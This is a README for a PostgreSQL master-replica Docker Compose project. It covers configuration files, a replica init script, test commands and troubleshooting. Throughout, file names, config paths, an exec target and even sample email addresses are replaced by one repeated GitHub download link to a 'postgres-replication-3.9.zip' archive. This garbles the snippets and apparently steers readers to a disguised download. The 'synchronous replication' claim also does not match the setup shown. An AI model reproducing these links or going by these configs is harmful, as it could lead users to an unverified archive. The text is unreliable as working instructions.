# PostgreSQL Master-Slave Replication with Docker Compose

This project sets up a PostgreSQL replication system with a master server and a slave replica server using Docker Compose.

## Prerequisites

- Docker Engine (version 20.10 or higher)
- Docker Compose (version 2.0 or higher)
- At least 2GB of available RAM
- Ports 5432 and 5433 free on the system

### Verify Docker Installation

```bash
# Check Docker version
docker --version

# Check Docker Compose version
docker compose version

# Check if Docker is running
docker info
```

## Project Structure

```
postgres-replica/
├── https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip          # Container configuration
├── https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip                   # This file
├── main/                       # Main PostgreSQL server
│   ├── conf/
│   │   ├── https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip     # PostgreSQL configurations
│   │   └── https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip        # Authentication configurations
│   ├── data/                   # Main server data
│   └── init/
│       └── https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip        # Initialization script
└── replica/                    # PostgreSQL replica server
    ├── data/                   # Replica server data
    └── init/                   # Replica initialization scripts
```

## Docker Compose Configuration

### Master Server (Main)

The master server is configured with:

- **Image**: `postgres:18`
- **Port**: `5432` (mapped to host)
- **Database**: `app_db`
- **Postgres password**: `Admin123`

#### Mounted Volumes:
- `./main/data`: Data persistence
- `./main/init`: Initialization scripts
- `https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip`: Custom PostgreSQL configurations
- `https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip`: Authentication configurations

#### Specific Replication Configurations:
```yaml
command: >
  -c https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip
```
#### Configuration Files

#### 1. https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip
```properties
listen_addresses = '*'          # Accept connections from any IP
wal_level = replica            # Enable replication
max_wal_senders = 10           # Maximum of 10 WAL sender processes
max_replication_slots = 10     # Maximum of 10 replication slots
hot_standby = on              # Allow reads on replica
hba_file = 'https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip'
```

#### 2. https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip
```properties
host replication userbackup 0.0.0.0/0 scram-sha-256  # Replication access
host all all 0.0.0.0/0 scram-sha-256                 # General database access
```

#### 3. https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip
```sql
-- Create replication user
CREATE ROLE userbackup WITH
    REPLICATION
    LOGIN
    PASSWORD 'Replica123';

-- Create physical replication slot
SELECT * FROM pg_create_physical_replication_slot('replication_slot_main');
```

### Replica Server (Replica)

The replica server is configured with:

- **Image**: `postgres:18`
- **Port**: `5433` (mapped to host)
- **Postgres password**: `Admin123`

#### Replica Initialization Process:
```bash
# Check if replica data already exists
if [ ! -s /var/lib/postgresql/data/PG_VERSION ]; then
  # Remove existing data
  rm -rf /var/lib/postgresql/data/*
  # Create base backup from master server
  PGPASSWORD=Replica123 pg_basebackup -h main -D /var/lib/postgresql/data -U userbackup -Fp -Xs -P -R
  # Create standby signal file
  touch https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip
fi
# Start PostgreSQL
exec https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip postgres
```

## How to Run

### 1. Clone/Download the Project
```bash
git clone <repository-url>
cd postgres-replica
```

### 2. Run Docker Compose
```bash
# Run in detached mode (background)
docker compose up -d

# Or run in interactive mode (to see logs)
docker compose up
```

### 3. Check Container Status
```bash
# Check status
docker compose ps

# Check logs
docker compose logs main
docker compose logs replica

# Check logs in real-time
docker compose logs -f
```

## Testing Replication

### 1. Connect to Master Server
```bash
# Using psql
psql -h localhost -p 5432 -U postgres -d app_db

# Using docker exec
docker exec -it postgres-main psql -U postgres -d app_db
```

### 2. Create Test Data
```sql
-- On master server
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    email VARCHAR(100)
);

INSERT INTO users (name, email) VALUES 
    ('John Silva', 'https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip'),
    ('Mary Santos', 'https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip');
```

### 3. Verify Data on Replica
```bash
# Connect to replica
psql -h localhost -p 5433 -U postgres -d app_db

# Or using docker exec
docker exec -it postgres-replica psql -U postgres -d app_db
```

```sql
-- On replica (read-only)
SELECT * FROM users;
```

### 4. Check Replication Status
```sql
-- On master server
SELECT * FROM pg_stat_replication;

-- On replica
SELECT * FROM pg_stat_wal_receiver;
```

## Useful Commands

### Stop Services
```bash
docker compose down
```

### Stop and Remove Volumes
```bash
docker compose down -v
```

### Restart Only One Service
```bash
docker compose restart main
docker compose restart replica
```

### View Logs for Specific Service
```bash
docker compose logs -f main
docker compose logs -f replica
```

### Execute Commands in Containers
```bash
# Access bash in master container
docker exec -it postgres-main bash

# Access psql in replica container
docker exec -it postgres-replica psql -U postgres
```

## Troubleshooting

### Issue: Replica cannot connect to master
- Check if master server is running: `docker compose ps`
- Check master logs: `docker compose logs main`
- Verify network configurations between containers

### Issue: Authentication error
- Verify `userbackup` user was created on master
- Check password `Replica123` in logs
- Verify `https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip` configuration

### Issue: Ports already in use
```bash
# Check which processes are using the ports
sudo netstat -tlnp | grep :5432
sudo netstat -tlnp | grep :5433

# Change ports in https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-3.9.zip if necessary
```

### Complete Configuration Reset
```bash
# Stop everything and remove volumes
docker compose down -v

# Remove local data
sudo rm -rf main/data/* replica/data/*

# Restart
docker compose up -d
```

## Configuration Features

- **Synchronous Replication**: Data is replicated automatically
- **Hot Standby**: Replica allows read queries
- **Automatic Base Backup**: Replica configures itself automatically on first run
- **Health Checks**: Automatic container health verification
- **Persistence**: Data is maintained in local volumes

## Security

⚠️ **Warning**: This configuration is for development/testing. For production:

- Change all default passwords
- Configure SSL/TLS
- Restrict network access (`0.0.0.0/0` → specific IPs)
- Use Docker secrets for passwords
- Configure automatic backup
- Monitor logs and performance PostgreSQL Master-Slave Replication com Docker Compose
